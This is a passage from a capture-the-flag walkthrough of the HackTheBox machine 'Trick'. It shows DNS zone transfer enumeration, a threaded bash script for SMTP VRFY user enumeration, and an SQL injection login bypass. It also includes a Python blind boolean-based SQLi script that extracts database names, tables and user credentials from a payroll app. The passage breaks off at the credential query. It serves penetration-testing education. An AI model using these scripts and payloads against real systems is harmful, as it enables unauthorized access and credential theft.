src="img/pasted-image-20251110190305.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251110190305.png" src="img/pasted-image-20251110190305.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The source code did not contain any valuable information, and the website did not appear to be the initial attack vector. At this point, how port <code>53</code> was opened will be enumerated as follows:</p></div><div class="el-h2"><h2 data-heading="TCP/UDP Port 53: DNS Enumeration Using `nslookup` &amp; `dig`" dir="auto" class="heading" id="TCP/UDP_Port_53_DNS_Enumeration_Using_`nslookup`_&amp;_`dig`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP/UDP Port 53: DNS Enumeration Using <code>nslookup</code> &amp; <code>dig</code></h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251110193248.png" src="img/pasted-image-20251110193248.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251110193248.png" src="img/pasted-image-20251110193248.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">To begin <code>DNS</code> enumeration, a <code>reverse DNS lookup</code> was performed to determine if a domain name was associated with the target IP. The lookup revealed the domain <strong><code>trick.htb</code></strong>. The tool used for this step was <strong><code>nslookup</code></strong>. An alternative method for performing the same lookup is shown below:</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">dig</span> <span class="token parameter variable">-x</span> <span class="token number">10.10</span>.11.166 @10.10.11.166
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251110193305.png" src="img/pasted-image-20251110193305.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251110193305.png" src="img/pasted-image-20251110193305.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Once the domain name associated with the target IP is obtained, it can be added to the <code>/etc/hosts</code> file. This allows the system to resolve the IP to the domain name, enabling further enumeration of potential subdomains, testing virtual hosting on the <code>HTTP</code> server, and other related activities.</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251110193347.png" src="img/pasted-image-20251110193347.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251110193347.png" src="img/pasted-image-20251110193347.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Once the domain name has been added, a second <code>DNS</code> enumeration will be performed by attempting a <code>DNS zone transfer attack</code>, as demonstrated below:</p></div><div class="el-h2"><h2 data-heading="TCP/UDP Port 53: DNS Zone Transfer Attack" dir="auto" class="heading" id="TCP/UDP_Port_53_DNS_Zone_Transfer_Attack_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP/UDP Port 53: DNS Zone Transfer Attack</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">dig</span> axfr trick.htb @10.10.11.166
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251110195621.png" src="img/pasted-image-20251110195621.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251110195621.png" src="img/pasted-image-20251110195621.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The <code>DNS zone transfer attack</code> was successful, revealing another subdomain: <strong><code>preprod-payroll.trick.htb</code></strong>. This subdomain was also added to the <code>/etc/hosts</code> file.</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251110195628.png" src="img/pasted-image-20251110195628.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251110195628.png" src="img/pasted-image-20251110195628.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">With this subdomain added, web enumeration can be performed more effectively than before, as sites using <strong>virtual hosting</strong> might not load all resources correctly without the proper domain resolution. However, before proceeding, a <code>Bash script</code> will be created to automate the enumeration of system users via the <code>SMTP</code> service, leveraging the <code>VRFY</code> command.</p></div><div class="el-h2"><h2 data-heading="TCP Port 25: SMTP User Enumeration via Manual Bash Script" dir="auto" class="heading" id="TCP_Port_25_SMTP_User_Enumeration_via_Manual_Bash_Script_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 25: SMTP User Enumeration via Manual Bash Script</h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112155130.png" src="img/pasted-image-20251112155130.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112155130.png" src="img/pasted-image-20251112155130.png" target="_self"></span></p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token shebang important">#!/bin/bash</span>

<span class="token assign-left variable">endColour</span><span class="token operator">=</span><span class="token string">"<span class="token entity" title="\033">\033</span>[0m<span class="token entity" title="\e">\e</span>[0m"</span>
<span class="token assign-left variable">blueColour</span><span class="token operator">=</span><span class="token string">"<span class="token entity" title="\e">\e</span>[0;34m<span class="token entity" title="\033">\033</span>[1m"</span>
<span class="token assign-left variable">yellowColour</span><span class="token operator">=</span><span class="token string">"<span class="token entity" title="\e">\e</span>[0;33m<span class="token entity" title="\033">\033</span>[1m"</span>

<span class="token assign-left variable">userfile</span><span class="token operator">=</span><span class="token string">"/home/krmena/SecLists/Usernames/xato-net-10-million-usernames.txt"</span>
<span class="token assign-left variable">userlist</span><span class="token operator">=</span>smtp_userlist.txt

<span class="token assign-left variable">max_threads</span><span class="token operator">=</span><span class="token number">400</span>
<span class="token assign-left variable">counter</span><span class="token operator">=</span><span class="token number">0</span>

<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">ls</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"userlist"</span><span class="token variable">)</span></span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
        <span class="token function">rm</span> <span class="token variable">$userlist</span><span class="token punctuation">;</span> <span class="token function">touch</span> <span class="token variable">$userlist</span>
<span class="token keyword">fi</span>

<span class="token builtin class-name">echo</span>

<span class="token keyword">while</span> <span class="token builtin class-name">read</span> <span class="token parameter variable">-r</span> user<span class="token punctuation">;</span> <span class="token keyword">do</span>

    <span class="token punctuation">(</span>
        <span class="token assign-left variable">response</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"EHLO test<span class="token entity" title="\n">\n</span>VRFY <span class="token variable">$user</span><span class="token entity" title="\n">\n</span>QUIT"</span> <span class="token operator">|</span> <span class="token function">nc</span> <span class="token number">10.10</span>.11.166 <span class="token number">25</span> <span class="token operator">|</span> <span class="token function">tail</span> <span class="token parameter variable">-n</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-n</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print $1}'</span><span class="token variable">)</span></span>

        <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$response</span>"</span> <span class="token operator">=</span> <span class="token string">"252"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
            <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token variable">${yellowColour}</span>[+]<span class="token variable">${endColour}</span> <span class="token variable">${blueColour}</span>User '<span class="token variable">$user</span>' exists<span class="token variable">${endColour}</span>"</span>
            <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$user</span>"</span> <span class="token operator">&gt;&gt;</span> <span class="token variable">$userlist</span>
        <span class="token keyword">fi</span>
    <span class="token punctuation">)</span> <span class="token operator">&amp;</span>

    <span class="token assign-left variable">counter</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>counter<span class="token operator">+</span><span class="token number">1</span><span class="token variable">))</span></span>
    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$counter</span>"</span> <span class="token parameter variable">-ge</span> <span class="token string">"<span class="token variable">$max_threads</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
        <span class="token function">wait</span>
        <span class="token assign-left variable">counter</span><span class="token operator">=</span><span class="token number">0</span>
    <span class="token keyword">fi</span>

<span class="token keyword">done</span> <span class="token operator">&lt;</span> <span class="token string">"<span class="token variable">$userfile</span>"</span>

<span class="token function">wait</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">The script uses a <code>while</code> loop to send requests to the <code>SMTP</code> service, iterating through the usernames listed in the <code>xato-net-10-million-usernames.txt</code> dictionary. Responses from the service are filtered for the code <code>252</code> which indicates that the system user exists.<br>
Since a single request typically takes around 5 seconds, too slow for efficient enumeration, the script employs <code>threads</code> to send multiple requests concurrently. The results are as follows:</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112155720.png" src="img/pasted-image-20251112155720.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112155720.png" src="img/pasted-image-20251112155720.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Several interesting users, such as <strong><code>michael</code></strong>, <strong><code>man</code></strong>, and <strong><code>games</code></strong>, were discovered. This information could be leveraged to perform an <code>SSH brute-force attack</code> using tools like <code>Hydra</code> however, it will be set aside for now. The next step is to continue with web enumeration</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: Discovering Routes and Resources Using `dirsearch`" dir="auto" class="heading" id="TCP_Port_80_Discovering_Routes_and_Resources_Using_`dirsearch`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Discovering Routes and Resources Using <code>dirsearch</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">dirsearch <span class="token parameter variable">-u</span> http://trick.htb/ --exclude-status<span class="token operator">=</span><span class="token number">403,404</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112133331.png" src="img/pasted-image-20251112133331.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112133331.png" src="img/pasted-image-20251112133331.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">To begin web service enumeration, a scan was performed to discover routes and resources; however, it did not reveal anything immediately interesting. Regardless, the resources will be downloaded and enumerated locally, filtering for keywords such as <strong><code>creds</code></strong>, <strong><code>pass</code></strong>, <strong><code>user</code></strong>, and similar terms.</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">grep</span> <span class="token parameter variable">-riE</span> <span class="token string">'dbpass|creds|password|trick|pass|user'</span> <span class="token parameter variable">--text</span> <span class="token builtin class-name">.</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112133447.png" src="img/pasted-image-20251112133447.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112133447.png" src="img/pasted-image-20251112133447.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">There were no relevant findings in the web resources, so next the other subdomain will be inspected to discover something interesting to take advantage of or obtain some valuable information.</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112134100.png" src="img/pasted-image-20251112134100.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112134100.png" src="img/pasted-image-20251112134100.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">When the website was visited, the first thing that appeared was an authentication panel. Common credentials such as <code>admin:admin</code> were tested but did not work. In this case, when an authentication panel is found it is common to attempt <code>SQLi</code>, <code>NoSQLi</code>, and other injections to try to bypass the authentication and log in, so next a simple <code>SQLi</code> will be performed:</p></div><div class="el-h1"><h1 data-heading="Exploitation" dir="auto" class="heading" id="Exploitation_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Exploitation</h1></div><div class="el-h2"><h2 data-heading="TCP Port 80: Authentication Panel Bypass via SQL Injection (SQLi)" dir="auto" class="heading" id="TCP_Port_80_Authentication_Panel_Bypass_via_SQL_Injection_(SQLi)_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Authentication Panel Bypass via SQL Injection (SQLi)</h2></div><div class="el-pre"><pre class="language-sql"><code data-line="0" class="language-sql is-loaded">'<span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">-- -</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112134149.png" src="img/pasted-image-20251112134149.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112134149.png" src="img/pasted-image-20251112134149.png" target="_self"></span></p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112134205.png" src="img/pasted-image-20251112134205.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112134205.png" src="img/pasted-image-20251112134205.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Great! When the simple <code>SQLi</code> payload <code>'or 1=1-- -</code> was tested, the authentication panel was bypassed and the <code>administrator</code> account was accessed. Before enumerating the entire web application, a <code>Python script</code> to automate the <code>SQLi</code> will be created to enumerate the database name, table names, column names, and all the records.</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: Blind Boolean‚ÄëBased SQL Injection (SQLi) Automated with a Python Script" dir="auto" class="heading" id="TCP_Port_80_Blind_Boolean‚ÄëBased_SQL_Injection_(SQLi)_Automated_with_a_Python_Script_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Blind Boolean‚ÄëBased SQL Injection (SQLi) Automated with a Python Script</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token string">'http://preprod-payroll.trick.htb/ajax.php?action=login'</span> <span class="token parameter variable">-d</span> <span class="token string">"username='or 1=1-- -&amp;password='test'"</span>
<span class="token function">curl</span> <span class="token string">'http://preprod-payroll.trick.htb/ajax.php?action=login'</span> <span class="token parameter variable">-d</span> <span class="token string">"username='or 1=3-- -&amp;password='test'"</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251113200324.png" src="img/pasted-image-20251113200324.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251113200324.png" src="img/pasted-image-20251113200324.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">To begin creating the <code>Python script</code>, it is necessary to determine what type of <code>SQLi</code> this is. To check this, two requests were performed: the first used a valid condition (<code>1=1</code>) and the second an invalid one (<code>1=2</code>). For the first request the web service responded with <code>1</code>, and for the second it responded with <code>3</code>. This suggests that when a query is true the web service responds with <code>1</code>, and when it is false it responds with <code>3</code>. Knowing this, the <code>SQLi</code> appears to be <code>boolean-based</code>, so the <code>script</code> will send many requests and filter the <code>HTTP</code> response for the number <code>1</code> to determine whether the condition is true or not.</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token string">'http://preprod-payroll.trick.htb/ajax.php?action=login'</span> <span class="token parameter variable">-d</span> <span class="token string">"username='or (select substring(database(),1,1))='p'-- -&amp;password='test'"</span>
<span class="token function">curl</span> <span class="token string">'http://preprod-payroll.trick.htb/ajax.php?action=login'</span> <span class="token parameter variable">-d</span> <span class="token string">"username='or (select substring(database(),1,1))='f'-- -&amp;password='test'"</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251113200611.png" src="img/pasted-image-20251113200611.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251113200611.png" src="img/pasted-image-20251113200611.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">To conclude this theory, another, more specific query was sent using the <code>substring</code> function to select only the first character of the current <code>database</code>. When that character was compared to <code>'p'</code>, the server response was <code>1</code>; when it was compared to <code>'g'</code>, the response was <code>3</code>. Therefore, the first character of the database name is <code>'p'</code>. Using this same method to enumerate character by character, the <code>database</code> names will be enumerated as follows:</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token string">' or substring ((select group_concat(shema_name) from information_schema.schemata),32,1)='</span>v'-- -
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112173450.png" src="img/pasted-image-20251112173450.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112173450.png" src="img/pasted-image-20251112173450.png" target="_self"></span></p></div><div class="el-pre"><pre class="language-python"><code data-line="0" class="language-python is-loaded"><span class="token comment">#!/usr/bin/python3</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> requests<span class="token punctuation">,</span> pdb<span class="token punctuation">,</span> string<span class="token punctuation">,</span> signal<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> time



<span class="token keyword">def</span> <span class="token function">def_handler</span><span class="token punctuation">(</span>sig<span class="token punctuation">,</span> frame<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n\n[!] Saliendo...\n"</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

signal<span class="token punctuation">.</span>signal<span class="token punctuation">(</span>signal<span class="token punctuation">.</span>SIGINT<span class="token punctuation">,</span> def_handler<span class="token punctuation">)</span>


login_url <span class="token operator">=</span> <span class="token string">"http://preprod-payroll.trick.htb/ajax.php?action=login"</span>
characters <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_uppercase <span class="token operator">+</span> <span class="token string">"-_,"</span>


<span class="token keyword">def</span> <span class="token function">makeRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>


        p1 <span class="token operator">=</span> log<span class="token punctuation">.</span>progress<span class="token punctuation">(</span><span class="token string">"SQLi"</span><span class="token punctuation">)</span>
        p1<span class="token punctuation">.</span>status<span class="token punctuation">(</span><span class="token string">"Iniciando proceso de fuerza bruta"</span><span class="token punctuation">)</span>

        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

        result <span class="token operator">=</span> <span class="token string">""</span>

        p2 <span class="token operator">=</span> log<span class="token punctuation">.</span>progress<span class="token punctuation">(</span><span class="token string">"SQLi"</span><span class="token punctuation">)</span>

        <span class="token keyword">for</span> position <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">for</span> character <span class="token keyword">in</span> characters<span class="token punctuation">:</span>
                        post_data <span class="token operator">=</span> <span class="token punctuation">{</span>
                                <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">"' or substring((select group_concat(schema_name) from information_schema.schemata),%d,1)='%s'-- -"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>position<span class="token punctuation">,</span> character<span class="token punctuation">)</span><span class="token punctuation">,</span>
                                <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'test'</span>
                        <span class="token punctuation">}</span>

                        p1<span class="token punctuation">.</span>status<span class="token punctuation">(</span>post_data<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


                        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>login_url<span class="token punctuation">,</span> data<span class="token operator">=</span>post_data<span class="token punctuation">)</span>

                        <span class="token keyword">if</span> r<span class="token punctuation">.</span>text <span class="token operator">==</span><span class="token string">"1"</span><span class="token punctuation">:</span>

                                result <span class="token operator">+=</span> character
                                p2<span class="token punctuation">.</span>status<span class="token punctuation">(</span>result<span class="token punctuation">)</span>
                                <span class="token keyword">break</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

        makeRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">The <code>script</code> basically iterates over two values: the character position and the compared character. When the server response is <code>1</code>, the character is added to the variable <code>result</code>, which is shown continuously using a progress bar from the <code>pwn</code> library. The query must be adjusted in the <code>script</code> when it finishes to then enumerate the table names, column names, etc. Once executed, the name of the <code>database</code> was determined to be <code>payroll_db</code>. Knowing this, the <code>SQL</code> query can be adjusted to enumerate the table names from this <code>database</code> as follows:</p></div><div class="el-pre"><pre class="language-python"><code data-line="0" class="language-python is-loaded"><span class="token string">' or hex(substring((select group_concat(table_name) from information_schema.tables where table_schema='</span>payroll_d<span class="token string">b'),%d,1))=hex('</span><span class="token operator">%</span>s'<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token operator">-</span> <span class="token operator">%</span> <span class="token punctuation">(</span>position<span class="token punctuation">,</span> character<span class="token punctuation">)</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112211810.png" src="img/pasted-image-20251112211810.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112211810.png" src="img/pasted-image-20251112211810.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Once the <code>script</code> was executed again with the new <code>SQL</code> query, the table names were displayed, with the result showing the table named <code>users</code> highlighted. The next query will enumerate all the column names from this table:</p></div><div class="el-pre"><pre class="language-python"><code data-line="0" class="language-python is-loaded"><span class="token string">' or hex(substring((select group_concat(column_name) from information_schema.columns where table_schema='</span>payroll_d<span class="token string">b' and table_name='</span>users<span class="token string">'),%d,1))=hex('</span><span class="token operator">%</span>s'<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token operator">-</span> <span class="token operator">%</span> <span class="token punctuation">(</span>position<span class="token punctuation">,</span> character<span class="token punctuation">)</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251112213027.png" src="img/pasted-image-20251112213027.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251112213027.png" src="img/pasted-image-20251112213027.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The column names were successfully retrieved; among them, the most important were <code>name</code>, <code>username</code>, and <code>password</code>. Finally, for these columns, the records will be enumerated using the following query:</p></div><div class="el-pre"><pre class="language-python"><code data-line="0" class="language-python is-loaded"><span class="token string">' or hex(substring((select group_concat(name,'</span><span class="token punctuation">:</span><span class="token string">',username,'</span><span class="token punctuation">:</span><span class="token string">',password) from users),%d,1))=hex('</span><span class="token operator">%</span>s'<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token operator">-</span> <span class="token operator">%</span> <span class="token punctuation">(</span>position<span class="token punctuation">,</span> character<span class="token punctuation">)</span>
